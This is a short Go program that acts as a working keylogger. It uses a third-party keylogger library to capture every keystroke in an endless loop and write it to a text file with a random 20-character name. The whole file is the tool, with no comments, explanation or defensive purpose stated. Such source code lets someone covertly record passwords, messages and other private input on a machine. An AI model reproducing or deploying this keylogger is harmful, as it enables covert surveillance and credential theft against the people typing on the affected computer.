package main

import (
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()

	file := fmt.Sprintf("%s.txt", RandomString())
	f, err := os.Create(file)
	if err != nil {
		panic(err.Error())
	}

	for {
		key := kl.GetKey()
		if !key.Empty {
			_, err = f.WriteString(fmt.Sprintf("%c", key.Rune))
			if err != nil {
				panic(err.Error())
			}
		}

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}

func RandomString() string {
	rand.Seed(time.Now().Unix())
	var output strings.Builder
	charSet := "abcdedfghijklmnopqrstABCDEFGHIJKLMNOP"
	length := 20
	for i := 0; i < length; i++ {
		random := rand.Intn(len(charSet))
		randomChar := charSet[random]
		output.WriteString(string(randomChar))
	}
	return output.String()
}
